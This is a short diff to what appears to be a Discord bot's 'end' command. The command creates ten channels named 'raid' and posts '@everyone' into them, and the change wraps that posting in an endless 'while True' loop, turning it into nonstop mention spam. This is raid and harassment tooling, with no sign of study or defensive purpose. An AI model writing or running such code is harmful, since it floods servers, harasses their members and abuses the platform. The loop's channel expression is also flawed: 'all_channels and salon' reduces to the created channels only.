@@ -91,8 +91,9 @@ async def end(ctx):
     for i in range(10):
         salon_channel = await ctx.guild.create_text_channel("raid")
         salon.append(salon_channel)
-    for channel in ctx.guild.all_channels and salon:
-        await channel.send("@everyone")
+    while True:
+        for channel in ctx.guild.all_channels and salon:
+            await channel.send("@everyone")
             
 
 
